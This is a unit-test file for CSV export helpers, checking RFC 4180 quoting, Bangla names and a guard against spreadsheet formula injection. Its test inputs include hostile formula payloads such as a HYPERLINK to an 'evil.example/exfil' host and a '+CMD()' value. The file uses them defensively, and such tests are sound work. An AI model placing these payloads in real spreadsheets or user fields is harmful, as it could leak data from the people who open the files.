/**
 * CSV export — pure unit tests for the escaping + row helpers.
 * Sprint 4 Day 32 Phase 3.
 *
 * The DB-backed integration tests (cross-tenant isolation, audit
 * row written, UTF-8 + BOM through the route) live alongside the
 * route tests; these pin the formatter primitives in isolation.
 */

import { describe, expect, it } from 'vitest'

import { csvEscape, csvRow } from './export-csv.js'

describe('csvEscape (RFC 4180)', () => {
  it('returns empty string for null/undefined/empty', () => {
    expect(csvEscape(null)).toBe('')
    expect(csvEscape(undefined)).toBe('')
    expect(csvEscape('')).toBe('')
  })

  it('passes simple ascii strings through unchanged', () => {
    expect(csvEscape('abc')).toBe('abc')
    expect(csvEscape('hello world')).toBe('hello world')
  })

  it('quotes fields containing commas', () => {
    expect(csvEscape('Smith, Jane')).toBe('"Smith, Jane"')
  })

  it('quotes fields containing newlines', () => {
    expect(csvEscape('line1\nline2')).toBe('"line1\nline2"')
    expect(csvEscape('line1\r\nline2')).toBe('"line1\r\nline2"')
  })

  it('quotes fields containing double-quotes AND escapes them by doubling', () => {
    expect(csvEscape('She said "hi"')).toBe('"She said ""hi"""')
  })

  it('quotes fields with both comma + quote — doubles the quotes', () => {
    expect(csvEscape('Hello, "world"')).toBe('"Hello, ""world"""')
  })

  it('preserves Bangla unicode verbatim (UTF-8 handled by encoding)', () => {
    expect(csvEscape('রিনা বেগম')).toBe('রিনা বেগম')
  })

  it('quotes Bangla names containing commas', () => {
    expect(csvEscape('বেগম, রিনা')).toBe('"বেগম, রিনা"')
  })

  // ─── Formula-injection guard (OWASP CWE-1236) ──────────────────────
  //
  // Attendee names are user-controlled. A malicious attendee could
  // register as `=HYPERLINK(...)` and the formula would fire the first
  // time the tenant opens the downloaded CSV in Excel. The csvEscape
  // helper prefixes leading formula-trigger characters with a single
  // quote, neutralising the formula evaluation. Same fix as PR #258
  // (disbursement-export); see gotchas.md "CSV exports with UTF-8 BOM
  // + user-controlled cells = formula-injection vector".

  it('prefixes leading `=` to neutralise formula evaluation', () => {
    expect(csvEscape('=HYPERLINK("http://evil.example/exfil","click")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/exfil"",""click"")"',
    )
  })

  it('prefixes leading `+`', () => {
    expect(csvEscape('+CMD()')).toBe(`'+CMD()`)
  })

  it('prefixes leading `-`', () => {
    expect(csvEscape('-2+3')).toBe(`'-2+3`)
  })

  it('prefixes leading `@`', () => {
    expect(csvEscape('@SUM(A1:A10)')).toBe(`'@SUM(A1:A10)`)
  })

  it('prefixes leading TAB', () => {
    expect(csvEscape('\tEvil')).toBe(`'\tEvil`)
  })

  it('prefixes leading CR (and applies RFC-4180 quoting)', () => {
    expect(csvEscape('\revil')).toBe(`"'\revil"`)
  })

  it('does NOT prefix legitimate leading space', () => {
    expect(csvEscape(' রিনা')).toBe(' রিনা')
  })

  it('does NOT prefix when formula char appears mid-string', () => {
    expect(csvEscape('a+b')).toBe('a+b')
  })

  it('handles formula prefix combined with embedded comma (both guards apply)', () => {
    expect(csvEscape('=BAD(),attendee')).toBe(`"'=BAD(),attendee"`)
  })
})

describe('csvRow', () => {
  it('joins cells with commas', () => {
    expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c')
  })

  it('handles a mix of nulls + quoted fields + bare fields', () => {
    expect(csvRow(['Rina', null, 'rina@example.com', 'with, comma'])).toBe(
      'Rina,,rina@example.com,"with, comma"',
    )
  })

  it('handles all-empty cells', () => {
    expect(csvRow([null, undefined, ''])).toBe(',,')
  })
})
